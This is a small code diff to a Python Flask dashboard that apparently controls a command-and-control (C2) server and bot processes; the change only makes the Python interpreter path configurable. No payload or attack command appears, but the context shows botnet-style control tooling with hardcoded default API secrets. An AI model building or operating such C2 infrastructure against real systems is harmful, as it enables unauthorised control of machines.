@@ -21,6 +21,9 @@ CORS(app)
 C2_SERVER_URL = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
 C2_API_KEY    = os.environ.get("C2_API_KEY",    "c2_super_secret_key_2026_123456")
 DASHBOARD_KEY = os.environ.get("DASHBOARD_KEY", "dashboard_secret_2026")
+# Python binary used to spawn c2_server / bot sub-processes.
+# start_all.sh exports PYTHON_BIN pointing to venv/bin/python.
+PYTHON_BIN    = os.environ.get("PYTHON_BIN",    "python3")
 
 # Headers forwarded to the C2 server on every proxied request
 C2_AUTH = {"X-API-Key": C2_API_KEY, "Content-Type": "application/json"}
@@ -141,7 +144,7 @@ def start_process(name: str):
 
     try:
         p = subprocess.Popen(
-            ["python3", script],       # python3 — Linux standard
+            [PYTHON_BIN, script],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
             cwd=BASE_DIR,
